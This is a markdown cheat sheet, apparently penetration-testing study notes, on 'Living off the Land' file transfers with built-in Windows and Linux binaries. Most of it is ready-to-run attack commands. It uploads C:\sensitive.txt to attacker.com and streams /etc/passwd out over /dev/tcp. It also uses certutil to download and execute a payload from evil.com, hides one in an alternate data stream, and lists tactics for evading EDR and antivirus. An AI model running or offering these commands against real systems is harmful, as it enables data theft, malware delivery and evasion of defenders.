---
tags: [lotl, living-off-the-land, file-transfer, stealth, evasion, lolbas, gtfobins]
aliases: [Living off the Land, LOTL, LOLBAS, GTFOBins]
---

# ğŸ¥· Living Off The Land (LOTL) File Transfers

[[ğŸ“ File Transfer Master Index|â† Back to Master Index]]

## ğŸ“– Concept

The term _Living off the Land_ was coined by **@obscuresec** & **@mattifestation** and refers to leveraging built-in binaries on **Windows** and **Linux** systems to perform tasks like:

- ğŸ“¤ **Uploads**
- ğŸ“¥ **Downloads**
- âš™ï¸ **Execution**
- ğŸ“– **File access**
- ğŸ” **Bypasses**

> **Why LOTL?** Reduces the need for external tools, helping evade EDRs, AVs, and logging solutions.

---

## ğŸ”§ Essential Resources

### ğŸªŸ **Windows â€“ LOLBAS**
> A catalog of Living off the Land Binaries And Scripts for Windows.
- [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

### ğŸ§ **Linux â€“ GTFOBins**
> A curated list of Unix binaries that can be abused by attackers or red teamers.
- [https://gtfobins.github.io/](https://gtfobins.github.io/)

**Useful filters:**
```
/download
/upload
+file read
+file write
```

---

## ğŸªŸ Windows LOTL Examples

### ğŸ“¤ Upload Using `certreq.exe`
**From target system:**
```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

**On attack server (catch file):**
```bash
sudo nc -lvnp 8000
```

> âš ï¸ **Note:** Some versions of `certreq.exe` do not support the `-Post` parameter.

### ğŸ“¥ Download Using `bitsadmin`
```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\Public\nc.exe
```
- Mimics Windows Update traffic
- Bypasses many proxy restrictions

### ğŸ“¥ PowerShell BITS Transfer
```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
- Supports proxies and credentials
- Runs in background

### ğŸ“¥ Download Using `certutil.exe`
```cmd
certutil.exe -urlcache -f http://10.10.10.32:8000/nc.exe nc.exe
```
- Originally for certificate operations
- Commonly used as wget replacement

### ğŸ“¤ Upload Using `curl.exe` (Windows 10+)
```cmd
curl.exe -X POST -F "file=@C:\sensitive.txt" http://attacker.com/upload
```

---

## ğŸ§ Linux LOTL Examples

### ğŸ“¥ Download Using OpenSSL

**On attacker (start SSL server):**
```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/file.sh
```

**On target (download file):**
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > file.sh
```

### ğŸ“¥ Download Using `/dev/tcp`
```bash
exec 3<>/dev/tcp/10.10.14.1/80
echo -e "GET /file.sh HTTP/1.1\r\nHost: 10.10.14.1\r\n\r\n" >&3
cat <&3 > file.sh
```

### ğŸ“¤ Upload Using `/dev/tcp`
```bash
exec 3<>/dev/tcp/10.10.14.1/9999
cat /etc/passwd >&3
exec 3>&-
```

### ğŸ“¥ Download Using `awk`
```bash
awk 'BEGIN {
  print "GET /file HTTP/1.0\r\n" |& "/inet/tcp/0/10.10.14.1/80"
  while (("/inet/tcp/0/10.10.14.1/80" |& getline) > 0)
    print $0
}'
```

---

## ğŸ¯ LOTL Quick Reference Matrix

| Binary | OS | Download | Upload | Proxy Support | Stealth |
|--------|-----|----------|--------|---------------|---------|
| certutil | Win | âœ… | âŒ | âœ… | â­â­â­ |
| bitsadmin | Win | âœ… | âŒ | âœ… | â­â­â­â­ |
| certreq | Win | âŒ | âœ… | âŒ | â­â­â­ |
| curl.exe | Win10+ | âœ… | âœ… | âœ… | â­â­ |
| openssl | Linux | âœ… | âœ… | âŒ | â­â­â­â­ |
| /dev/tcp | Linux | âœ… | âœ… | âŒ | â­â­â­ |
| awk | Linux | âœ… | âœ… | âŒ | â­â­â­ |

---

## ğŸ’¡ Advanced Techniques

### Chaining LOTL Binaries
```powershell
# Download + Execute in one line
certutil -urlcache -f http://evil.com/p.exe p.exe & p.exe
```

### Obfuscation
```cmd
# Using alternate data streams
certutil -urlcache -f http://evil.com/p.exe file.txt:p.exe
```

### Time-based Evasion
```cmd
# Delay execution using timeout
timeout /t 60 & certutil -urlcache -f http://evil.com/p.exe p.exe
```

---

## ğŸ›¡ï¸ Detection & Evasion

### Common Detection Points
- âŒ Unusual certutil network connections
- âŒ Bitsadmin creating executables
- âŒ OpenSSL client connections
- âŒ Suspicious /dev/tcp usage

### Evasion Strategies
1. **Use common ports**: 80, 443, 8080
2. **Mimic legitimate traffic**: User-Agent strings
3. **Time-based execution**: Business hours
4. **Encrypt payloads**: Base64, XOR
5. **Chain multiple techniques**: Reduce individual IoCs

---

## ğŸ“š Related Topics
- [[Detect or be Detected/Evade Detection|Evasion Techniques]]
- [[Detect or be Detected/Detection - How Malicious File Transfers Are Caught|Detection Methods]]
- [[Windows File Transfer Methods|Windows Methods]]
- [[Linux File Transfer Methods|Linux Methods]]
- [[Protected File Transfers|Encrypted Transfers]]

---

## ğŸ·ï¸ Tags
#lotl #living-off-the-land #file-transfer #stealth #evasion #lolbas #gtfobins #post-exploitation